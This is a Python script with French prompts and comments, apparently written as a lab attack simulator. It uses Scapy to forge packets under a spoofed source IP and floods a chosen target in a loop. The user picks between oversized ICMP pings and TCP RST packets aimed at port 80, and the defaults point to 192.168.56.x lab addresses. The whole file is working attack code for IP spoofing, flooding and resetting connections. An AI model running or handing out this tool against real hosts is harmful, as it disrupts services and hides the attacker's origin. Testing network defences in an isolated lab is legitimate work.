from scapy.all import IP, ICMP, TCP, send
import time
import sys

print("=====================================================")
print(" 👿 SIMULATEUR D'ATTAQUE (SPOOFING IP MULTIPLE) ")
print("=====================================================")
print("Cet outil permet de simuler une attaque provenant de")
print("n'importe quelle adresse IP, sans avoir à modifier")
print("les vrais paramètres réseau de votre ordinateur Windows !")
print("-----------------------------------------------------")

# 1. Demander la fausse adresse IP
fake_ip = input("1. Entrez la FAUSSE IP de l'attaquant (ex: 192.168.56.200) : ")
if not fake_ip:
    fake_ip = "192.168.56.200"

# 2. Demander la cible
target_ip = input("2. Entrez l'IP du serveur cible (ex: 192.168.56.103) : ")
if not target_ip:
    target_ip = "192.168.56.103"

# 3. Choisir l'arme
print("\n[1] Ping Geant (ICMP Flood de 1500 octets)")
print("[2] Attaque TCP RST (Force un Reset de connexion)")
attack_type = input("3. Choisissez l'arme (1 ou 2) : ")

print(f"\n🚀 Lancement de l'attaque. Scapy forge les paquets au nom de {fake_ip}...")
print("🛑 Appuyez sur Ctrl+C pour stopper les tirs.")

try:
    while True:
        # Création de la couche IP avec l'adresse USURPÉE (Spoofing)
        ip_layer = IP(src=fake_ip, dst=target_ip)
        
        if attack_type == "2":
            # Packet TCP RST
            transport_layer = TCP(sport=12345, dport=80, flags="R")
            packet = ip_layer / transport_layer
        else:
            # Packet Ping avec 1200 caractères de charge utile (Assez lourd pour déclencher, et sous la limite MTU de la carte réseau)
            transport_layer = ICMP(type=8, code=0)
            payload = "X" * 1200 
            packet = ip_layer / transport_layer / payload
        
        # Envoi silencieux sur le réseau
        send(packet, verbose=False)
        
        # On attend un tout petit peu pour ne pas geler ton PC
        time.sleep(0.1)
        
except KeyboardInterrupt:
    print("\n[!] Attaque stoppée par le commandant.")
    sys.exit(0)
